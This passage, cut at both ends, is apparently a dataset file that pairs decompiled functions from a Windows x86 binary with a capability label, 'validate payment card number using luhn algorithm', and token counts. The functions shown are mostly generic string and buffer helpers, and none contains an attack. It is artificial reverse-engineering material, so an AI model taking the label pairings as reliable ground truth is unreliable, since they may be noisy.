            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00407770(uint arg_8h)\n\n{\n    int32_t *piVar1;\n    uint uVar2;\n    int32_t arg_10h;\n    uint arg_8h_00;\n    uint *arg_10h_00;\n    int32_t arg_8h_01;\n    uint32_t var_2ch;\n    uint var_28h;\n    int32_t var_24h;\n    uint var_20h;\n    uint var_1ch;\n    int32_t var_18h;\n    uint var_14h;\n    uint32_t var_10h;\n    int32_t var_ch;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    var_4h = *0x49106c ^ &stack0xfffffffc;\n    var_ch = fcn.00404960();\n    var_18h = fcn.00404960();\n    var_10h = *(var_18h + 0x10);\n    var_20h = fcn.00406170();\n    if (var_10h < 8) {\n        arg_8h_01 = 8;\n        fcn.00407240(var_ch, var_20h, 8);\n        *(var_ch + 0x10) = var_10h;\n        *(var_ch + 0x14) = 7;\n    }\n    else {\n        var_1ch = fcn.00404960();\n        var_28h = fcn.00407890();\n        var_2ch = var_10h | 7;\n        piVar1 = fcn.00407940(&var_2ch, &var_28h);\n        var_24h = *piVar1;\n        arg_8h_01 = var_24h + 1;\n        var_8h = fcn.00407910(arg_8h_01);\n        arg_10h_00 = &var_8h;\n        uVar2 = fcn.00401440(var_ch);\n        fcn.00408ce0(var_1ch, uVar2, arg_10h_00);\n        arg_10h = var_10h + 1;\n        uVar2 = var_20h;\n        arg_8h_00 = fcn.00401440(var_8h);\n        fcn.00407240(arg_8h_00, uVar2, arg_10h);\n        *(var_ch + 0x10) = var_10h;\n        *(var_ch + 0x14) = var_24h;\n    }\n    fcn.0043a2e7(arg_8h_01);\n    return;\n}\n",
        "token_count": 590
    },
    "00407890": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1ch\n\nvoid fcn.00407890(void)\n\n{\n    uint uVar1;\n    int32_t *piVar2;\n    uint var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    var_4h = *0x49106c ^ &stack0xfffffffc;\n    uVar1 = fcn.00404960();\n    var_8h = fcn.004012f0(uVar1);\n    var_10h = 8;\n    piVar2 = fcn.00406a60(&var_8h, &var_10h);\n    var_14h = *piVar2;\n    var_18h = var_14h + -1;\n    var_1ch = fcn.004012f0();\n    fcn.00407940(&var_1ch, &var_18h);\n    fcn.0043a2e7(var_1ch);\n    return;\n}\n",
        "token_count": 254
    },
    "00407970": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00407970(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint uVar1;\n    uint var_4h;\n    \n    uVar1 = fcn.00409380(0, arg_ch);\n    uVar1 = fcn.00401440(uVar1);\n    fcn.00405010(uVar1);\n    return arg_8h;\n}\n",
        "token_count": 92
    },
    "004079b0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004079b0(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint uVar1;\n    uint var_4h;\n    \n    uVar1 = fcn.004093c0(arg_10h);\n    uVar1 = fcn.00401440(uVar1);\n    fcn.00405010(uVar1);\n    return arg_8h;\n}\n",
        "token_count": 93
    },
    "004079f0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004079f0(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint arg_8h_00;\n    int32_t *in_FS_OFFSET;\n    uint var_2ch;\n    uint var_28h;\n    uint32_t var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x4704d8;\n    var_ch = *in_FS_OFFSET;\n    var_10h = *0x49106c ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    fcn.004057c0(var_10h);\n    var_4h = 0;\n    iVar1 = fcn.00401340(arg_ch);\n    iVar2 = fcn.00404d90();\n    arg_8h_00 = fcn.00401440(iVar1 + iVar2);\n    fcn.004094a0(arg_8h_00);\n    fcn.00405540(arg_ch);\n    fcn.00405560(arg_10h);\n    fcn.004056d0(&var_28h);\n    var_4h = 0xffffffff;\n    fcn.004055f0();\n    *in_FS_OFFSET = var_ch;\n    fcn.0043a2e7(arg_ch);\n    return;\n}\n",
        "token_count": 329
    },
    "00407ac0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00407ac0(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint uVar1;\n    uint var_4h;\n    \n    uVar1 = fcn.00409580(0, arg_ch);\n    uVar1 = fcn.00401440(uVar1);\n    fcn.004056d0(uVar1);\n    return arg_8h;\n}\n",
        "token_count": 94
    },
    "00407b00": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00407b00(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint arg_8h_00;\n    int32_t *in_FS_OFFSET;\n    uint var_2ch;\n    uint var_28h;\n    uint32_t var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x4704d8;\n    var_ch = *in_FS_OFFSET;\n    var_10h = *0x49106c ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    fcn.004057c0(var_10h);\n    var_4h = 0;\n    iVar1 = fcn.00404d90();\n    iVar2 = fcn.00401340(arg_10h);\n    arg_8h_00 = fcn.00401440(iVar1 + iVar2);\n    fcn.004094a0(arg_8h_00);\n    fcn.00405560(arg_ch);\n    fcn.00405540(arg_10h);\n    fcn.004056d0(&var_28h);\n    var_4h = 0xffffffff;\n    fcn.004055f0();\n    *in_FS_OFFSET = var_ch;\n    fcn.0043a2e7(arg_ch);\n    return;\n}\n",
        "token_count": 331
    },
    "00407bd0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00407bd0(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint uVar1;\n    uint var_4h;\n    \n    uVar1 = fcn.004054d0(arg_10h);\n    uVar1 = fcn.00401440(uVar1);\n    fcn.004056d0(uVar1);\n    return arg_8h;\n}\n",
        "token_count": 94
    },
    "00407c10": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00407c10(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t *in_FS_OFFSET;\n    uint var_2ch;\n    uint var_28h;\n    uint32_t var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x470508;\n    var_ch = *in_FS_OFFSET;\n    var_10h = *0x49106c ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    fcn.00405100(var_10h);\n    var_4h = 0;\n    iVar1 = fcn.00404d90();\n    iVar2 = fcn.00404d90();\n    fcn.004092c0(iVar1 + iVar2);\n    fcn.004093f0(arg_ch);\n    fcn.004093f0(arg_10h);\n    fcn.00405010(&var_28h);\n    var_4h = 0xffffffff;\n    fcn.00404f30();\n    *in_FS_OFFSET = var_ch;\n    fcn.0043a2e7(arg_ch);\n    return;\n}\n",
        "token_count": 296
    },
    "00407cd0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00407cd0(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint uVar4;\n    uint var_4h;\n    \n    uVar1 = fcn.00404d90();\n    iVar2 = fcn.00409560();\n    iVar3 = fcn.00404d90();\n    if (iVar2 - iVar3 < uVar1) {\n        iVar2 = fcn.00409560();\n        iVar3 = fcn.00404d90();\n        uVar1 = fcn.00404d90();\n        if (uVar1 <= iVar2 - iVar3) {\n            uVar4 = fcn.004095c0(0, arg_ch);\n            uVar4 = fcn.00401440(uVar4);\n            fcn.004056d0(uVar4);\n            return arg_8h;\n        }\n    }\n    uVar4 = fcn.00405500(arg_10h);\n    uVar4 = fcn.00401440(uVar4);\n    fcn.004056d0(uVar4);\n    return arg_8h;\n}\n",
        "token_count": 271
    },
    "00407d80": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00407d80(uint noname_0, uint arg_ch, uint arg_10h)\n\n{\n    uint arg_8h;\n    uint var_4h;\n    \n    fcn.00401300(0x18, arg_ch);\n    arg_8h = fcn.00401440(arg_10h);\n    fcn.00405010(arg_8h);\n    return;\n}\n",
        "token_count": 91
    },
    "00407db0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.00407db0(int32_t param_1, uint param_2)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint arg_8h;\n    uint arg_ch;\n    uint arg_10h;\n    uint *puVar6;\n    int32_t *in_FS_OFFSET;\n    int32_t var_8h;\n    uint var_ch_2;\n    uint var_10h;\n    uint var_ch;\n    int32_t iVar7;\n    int32_t arg_10h_00;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    int32_t var_ch_3;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x470530;\n    var_ch_3 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_ch_3;\n    piVar1 = fcn.004072d0();\n    iVar2 = (var_8h - *piVar1) / 0x18;\n    uVar3 = fcn.00404960();\n    iVar4 = fcn.00409190();\n    iVar5 = fcn.00409150();\n    if (iVar4 == iVar5) {\n        fcn.00408ff0();\n    }\n    arg_8h = fcn.004090a0(iVar4 + 1);\n    iVar5 = fcn.004091c0(arg_8h);\n    var_4h = 0;\n    arg_ch = fcn.00401440(iVar2 * 0x18 + iVar5);\n    arg_10h = fcn.00401440(var_ch_2);\n    fcn.00407d80(uVar3, arg_ch, arg_10h);\n    piVar1 = fcn.00404940();\n    if (var_8h == *piVar1) {\n        iVar7 = iVar5;\n        puVar6 = fcn.00404940();\n        uVar3 = *puVar6;\n        puVar6 = fcn.004072d0();\n        fcn.004090f0(*puVar6, uVar3, iVar7);\n    }\n    else {\n        iVar7 = var_8h;\n        arg_10h_00 = iVar5;\n        puVar6 = fcn.004072d0();\n        fcn.00409120(*puVar6, iVar7, arg_10h_00);\n        iVar7 = iVar5 + 0x18 + iVar2 * 0x18;\n        puVar6 = fcn.00404940();\n        fcn.00409120(var_8h, *puVar6, iVar7);\n    }\n    var_4h = 0xffffffff;\n    fcn.00409000(iVar5, iVar4 + 1, arg_8h);\n    piVar1 = fcn.004072d0();\n    iVar4 = *piVar1;\n    *in_FS_OFFSET = var_ch_3;\n    return iVar2 * 0x18 + iVar4;\n}\n",
        "token_count": 752
    },
    "00407f90": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.00407f90(uint arg_8h)\n\n{\n    uint arg_ch;\n    uint in_ECX;\n    uint var_8h;\n    uint var_1h;\n    \n    arg_ch = fcn.00401440(arg_8h);\n    fcn.00409930(var_1h, arg_ch);\n    return in_ECX;\n}\n",
        "token_count": 107
    },
    "004080f0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __fastcall fcn.004080f0(uint param_1)\n\n{\n    uint var_4h;\n    \n    fcn.00452000(param_1, 0, 0x100);\n    return param_1;\n}\n",
        "token_count": 51
    },
    "00408120": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00408120(uint32_t arg_8h, uint arg_ch, uint32_t arg_10h)\n\n{\n    uint32_t uVar1;\n    uint *arg_ch_00;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint uVar4;\n    uint arg_8h_00;\n    uint uVar5;\n    uint *arg_10h_00;\n    int32_t arg_10h_01;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    var_4h = *0x49106c ^ &stack0xfffffffc;\n    arg_ch_00 = fcn.00404960();\n    arg_10h_01 = arg_ch_00[4];\n    iVar2 = fcn.00407890();\n    if (iVar2 - arg_10h_01 < arg_8h) {\n        fcn.00409220();\n    }\n    uVar1 = arg_ch_00[5];\n    uVar3 = fcn.00409230(arg_10h_01 + arg_8h);\n    uVar4 = fcn.00404960();\n    var_8h = fcn.00407910(-(0xfffffffe < uVar3) | uVar3 + 1);\n    fcn.00401420();\n    arg_ch_00[4] = arg_10h_01 + arg_8h;\n    arg_ch_00[5] = uVar3;\n    arg_8h_00 = fcn.00401440(var_8h);\n    if (uVar1 < 8) {\n        fcn.00404ea0(arg_8h_00, arg_ch_00, arg_10h_01, arg_10h & 0xffff);\n        arg_10h_00 = &var_8h;\n        uVar5 = fcn.00401440(arg_ch_00);\n        fcn.00408ce0(uVar4, uVar5, arg_10h_00);\n    }\n    else {\n        uVar4 = *arg_ch_00;\n        arg_10h = arg_10h & 0xffff;\n        uVar5 = fcn.00401440(uVar4);\n        fcn.00404ea0(arg_8h_00, uVar5, arg_10h_01, arg_10h);\n        fcn.00407710(uVar4, uVar1 + 1);\n        *arg_ch_00 = var_8h;\n    }\n    fcn.0043a2e7(arg_8h_00);\n    return;\n}\n",
        "token_count": 636
    },
    "00408270": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.00408270(uint arg_8h)\n\n{\n    uint arg_ch;\n    uint in_ECX;\n    uint var_8h;\n    uint var_1h;\n    \n    arg_ch = fcn.00401440(arg_8h);\n    fcn.00409960(var_1h, arg_ch);\n    return in_ECX;\n}\n",
        "token_count": 106
    },
    "00408340": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00408340(uint32_t arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    uint32_t uVar1;\n    uint *arg_ch_00;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint uVar4;\n    uint arg_8h_00;\n    uint uVar5;\n    uint *arg_10h_00;\n    int32_t arg_10h_01;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    var_4h = *0x49106c ^ &stack0xfffffffc;\n    arg_ch_00 = fcn.00404960();\n    arg_10h_01 = arg_ch_00[4];\n    iVar2 = fcn.004069e0();\n    if (iVar2 - arg_10h_01 < arg_8h) {\n        fcn.00409220();\n    }\n    uVar1 = arg_ch_00[5];\n    uVar3 = fcn.00409410(arg_10h_01 + arg_8h);\n    uVar4 = fcn.00404960();\n    var_8h = fcn.004071d0(-(0xfffffffe < uVar3) | uVar3 + 1);\n    fcn.00401420();\n    arg_ch_00[4] = arg_10h_01 + arg_8h;\n    arg_ch_00[5] = uVar3;\n    arg_8h_00 = fcn.00401440(var_8h);\n    if (uVar1 < 0x10) {\n        fcn.00405470(arg_8h_00, arg_ch_00, arg_10h_01, arg_10h, arg_14h, arg_18h);\n        arg_10h_00 = &var_8h;\n        uVar5 = fcn.00401440(arg_ch_00);\n        fcn.00408ce0(uVar4, uVar5, arg_10h_00);\n    }\n    else {\n        uVar4 = *arg_ch_00;\n        uVar5 = fcn.00401440(uVar4);\n        fcn.00405470(arg_8h_00, uVar5, arg_10h_01, arg_10h, arg_14h, arg_18h);\n        fcn.00407200(uVar4, uVar1 + 1);\n        *arg_ch_00 = var_8h;\n    }\n    fcn.0043a2e7(arg_8h_00);\n    return;\n}\n",
        "token_count": 649
    },
    "00408520": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nvoid __cdecl fcn.00408520(uint arg_8h, uint arg_ch)\n\n{\n    uint var_1h;\n    \n    fcn.00409990(arg_8h, arg_ch);\n    return;\n}\n",
        "token_count": 64
    },
    "00408560": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nvoid __cdecl fcn.00408560(uint arg_8h, uint arg_ch)\n\n{\n    uint32_t in_ECX;\n    uint var_1h;\n    \n    fcn.00408580(arg_8h, arg_ch, in_ECX >> 0x18);\n    return;\n}\n",
        "token_count": 81
    },
    "00408590": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00408590(uint32_t arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint32_t uVar1;\n    uint *arg_8h_00;\n    uint32_t uVar2;\n    uint noname_0;\n    uint uVar3;\n    uint *arg_10h_00;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    var_4h = *0x49106c ^ &stack0xfffffffc;\n    uVar1 = fcn.00407890();\n    if (uVar1 < arg_8h) {\n        fcn.00409220();\n    }\n    arg_8h_00 = fcn.00404960();\n    uVar1 = arg_8h_00[5];\n    uVar2 = fcn.00409230(arg_8h);\n    noname_0 = fcn.00404960();\n    var_8h = fcn.00407910(-(0xfffffffe < uVar2) | uVar2 + 1);\n    fcn.00401420();\n    arg_8h_00[4] = arg_8h;\n    arg_8h_00[5] = uVar2;\n    uVar3 = fcn.00401440(var_8h);\n    fcn.00406580(uVar3, arg_8h, arg_10h);\n    if (uVar1 < 8) {\n        arg_10h_00 = &var_8h;\n        uVar3 = fcn.00401440(arg_8h_00);\n        fcn.00408ce0(noname_0, uVar3, arg_10h_00);\n    }\n    else {\n        uVar3 = *arg_8h_00;\n        fcn.00407710(uVar3, uVar1 + 1);\n        *arg_8h_00 = var_8h;\n    }\n    fcn.0043a2e7(uVar3);\n    return;\n}\n",
        "token_count": 482
    },
    "00408690": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00408690(uint32_t arg_8h, uint arg_ch, uint arg_10h, uint32_t arg_14h)\n\n{\n    uint32_t uVar1;\n    uint *arg_ch_00;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint uVar4;\n    uint arg_8h_00;\n    uint uVar5;\n    uint *arg_10h_00;\n    int32_t arg_10h_01;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    var_4h = *0x49106c ^ &stack0xfffffffc;\n    arg_ch_00 = fcn.00404960();\n    arg_10h_01 = arg_ch_00[4];\n    iVar2 = fcn.00407890();\n    if (iVar2 - arg_10h_01 < arg_8h) {\n        fcn.00409220();\n    }\n    uVar1 = arg_ch_00[5];\n    uVar3 = fcn.00409230(arg_10h_01 + arg_8h);\n    uVar4 = fcn.00404960();\n    var_8h = fcn.00407910(-(0xfffffffe < uVar3) | uVar3 + 1);\n    fcn.00401420();\n    arg_ch_00[4] = arg_10h_01 + arg_8h;\n    arg_ch_00[5] = uVar3;\n    arg_8h_00 = fcn.00401440(var_8h);\n    if (uVar1 < 8) {\n        fcn.00406670(arg_8h_00, arg_ch_00, arg_10h_01, arg_10h, arg_14h & 0xffff);\n        arg_10h_00 = &var_8h;\n        uVar5 = fcn.00401440(arg_ch_00);\n        fcn.00408ce0(uVar4, uVar5, arg_10h_00);\n    }\n    else {\n        uVar4 = *arg_ch_00;\n        arg_14h = arg_14h & 0xffff;\n        uVar5 = fcn.00401440(uVar4);\n        fcn.00406670(arg_8h_00, uVar5, arg_10h_01, arg_10h, arg_14h);\n        fcn.00407710(uVar4, uVar1 + 1);\n        *arg_ch_00 = var_8h;\n    }\n    fcn.0043a2e7(arg_8h_00);\n    return;\n}\n",
        "token_count": 650
    },
    "004087e0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004087e0(uint32_t arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    uint32_t uVar1;\n    uint *arg_ch_00;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint uVar4;\n    uint arg_8h_00;\n    uint uVar5;\n    uint *arg_10h_00;\n    int32_t arg_10h_01;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    var_4h = *0x49106c ^ &stack0xfffffffc;\n    arg_ch_00 = fcn.00404960();\n    arg_10h_01 = arg_ch_00[4];\n    iVar2 = fcn.004069e0();\n    if (iVar2 - arg_10h_01 < arg_8h) {\n        fcn.00409220();\n    }\n    uVar1 = arg_ch_00[5];\n    uVar3 = fcn.00409410(arg_10h_01 + arg_8h);\n    uVar4 = fcn.00404960();\n    var_8h = fcn.004071d0(-(0xfffffffe < uVar3) | uVar3 + 1);\n    fcn.00401420();\n    arg_ch_00[4] = arg_10h_01 + arg_8h;\n    arg_ch_00[5] = uVar3;\n    arg_8h_00 = fcn.00401440(var_8h);\n    if (uVar1 < 0x10) {\n        fcn.00406c70(arg_8h_00, arg_ch_00, arg_10h_01, arg_10h, arg_14h, arg_18h, arg_1ch);\n        arg_10h_00 = &var_8h;\n        uVar5 = fcn.00401440(arg_ch_00);\n        fcn.00408ce0(uVar4, uVar5, arg_10h_00);\n    }\n    else {\n        uVar4 = *arg_ch_00;\n        uVar5 = fcn.00401440(uVar4);\n        fcn.00406c70(arg_8h_00, uVar5, arg_10h_01, arg_10h, arg_14h, arg_18h, arg_1ch);\n        fcn.00407200(uVar4, uVar1 + 1);\n        *arg_ch_00 = var_8h;\n    }\n    fcn.0043a2e7(arg_8h_00);\n    return;\n}\n",
        "token_count": 668
    },
    "00408940": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00408940(uint32_t arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint32_t uVar1;\n    uint *arg_8h_00;\n    uint32_t uVar2;\n    uint noname_0;\n    uint uVar3;\n    uint *arg_10h_00;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    var_4h = *0x49106c ^ &stack0xfffffffc;\n    uVar1 = fcn.004069e0();\n    if (uVar1 < arg_8h) {\n        fcn.00409220();\n    }\n    arg_8h_00 = fcn.00404960();\n    uVar1 = arg_8h_00[5];\n    uVar2 = fcn.00409410(arg_8h);\n    noname_0 = fcn.00404960();\n    var_8h = fcn.004071d0(-(0xfffffffe < uVar2) | uVar2 + 1);\n    fcn.00401420();\n    arg_8h_00[4] = arg_8h;\n    arg_8h_00[5] = uVar2;\n    uVar3 = fcn.00401440(var_8h);\n    fcn.00406da0(uVar3, arg_8h, arg_10h);\n    if (uVar1 < 0x10) {\n        arg_10h_00 = &var_8h;\n        uVar3 = fcn.00401440(arg_8h_00);\n        fcn.00408ce0(noname_0, uVar3, arg_10h_00);\n    }\n    else {\n        uVar3 = *arg_8h_00;\n        fcn.00407200(uVar3, uVar1 + 1);\n        *arg_8h_00 = var_8h;\n    }\n    fcn.0043a2e7(uVar3);\n    return;\n}\n",
        "token_count": 487
    },
    "00408a40": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00408a40(uint32_t arg_8h, uint arg_ch, uint arg_10h, uint32_t arg_14h)\n\n{\n    uint32_t uVar1;\n    uint *arg_ch_00;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint uVar4;\n    uint arg_8h_00;\n    uint uVar5;\n    uint *arg_10h_00;\n    int32_t arg_10h_01;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    var_4h = *0x49106c ^ &stack0xfffffffc;\n    arg_ch_00 = fcn.00404960();\n    arg_10h_01 = arg_ch_00[4];\n    iVar2 = fcn.004069e0();\n    if (iVar2 - arg_10h_01 < arg_8h) {\n        fcn.00409220();\n    }\n    uVar1 = arg_ch_00[5];\n    uVar3 = fcn.00409410(arg_10h_01 + arg_8h);\n    uVar4 = fcn.00404960();\n    var_8h = fcn.004071d0(-(0xfffffffe < uVar3) | uVar3 + 1);\n    fcn.00401420();\n    arg_ch_00[4] = arg_10h_01 + arg_8h;\n    arg_ch_00[5] = uVar3;\n    arg_8h_00 = fcn.00401440(var_8h);\n    if (uVar1 < 0x10) {\n        fcn.00406e80(arg_8h_00, arg_ch_00, arg_10h_01, arg_10h, arg_14h & 0xff);\n        arg_10h_00 = &var_8h;\n        uVar5 = fcn.00401440(arg_ch_00);\n        fcn.00408ce0(uVar4, uVar5, arg_10h_00);\n    }\n    else {\n        uVar4 = *arg_ch_00;\n        arg_14h = arg_14h & 0xff;\n        uVar5 = fcn.00401440(uVar4);\n        fcn.00406e80(arg_8h_00, uVar5, arg_10h_01, arg_10h, arg_14h);\n        fcn.00407200(uVar4, uVar1 + 1);\n        *arg_ch_00 = var_8h;\n    }\n    fcn.0043a2e7(arg_8h_00);\n    return;\n}\n",
        "token_count": 657
    },
    "00408b90": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00408b90(uint32_t arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint32_t uVar1;\n    uint *arg_ch_00;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint uVar4;\n    uint arg_8h_00;\n    uint uVar5;\n    uint *arg_10h_00;\n    int32_t arg_10h_01;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    var_4h = *0x49106c ^ &stack0xfffffffc;\n    arg_ch_00 = fcn.00404960();\n    arg_10h_01 = arg_ch_00[4];\n    iVar2 = fcn.004069e0();\n    if (iVar2 - arg_10h_01 < arg_8h) {\n        fcn.00409220();\n    }\n    uVar1 = arg_ch_00[5];\n    uVar3 = fcn.00409410(arg_10h_01 + arg_8h);\n    uVar4 = fcn.00404960();\n    var_8h = fcn.004071d0(-(0xfffffffe < uVar3) | uVar3 + 1);\n    fcn.00401420();\n    arg_ch_00[4] = arg_10h_01 + arg_8h;\n    arg_ch_00[5] = uVar3;\n    arg_8h_00 = fcn.00401440(var_8h);\n    if (uVar1 < 0x10) {\n        fcn.00406f80(arg_8h_00, arg_ch_00, arg_10h_01, arg_10h, arg_14h);\n        arg_10h_00 = &var_8h;\n        uVar5 = fcn.00401440(arg_ch_00);\n        fcn.00408ce0(uVar4, uVar5, arg_10h_00);\n    }\n    else {\n        uVar4 = *arg_ch_00;\n        uVar5 = fcn.00401440(uVar4);\n        fcn.00406f80(arg_8h_00, uVar5, arg_10h_01, arg_10h, arg_14h);\n        fcn.00407200(uVar4, uVar1 + 1);\n        *arg_ch_00 = var_8h;\n    }\n    fcn.0043a2e7(arg_8h_00);\n    return;\n}\n",
        "token_count": 636
    },
    "00408ce0": {
        "rules": [
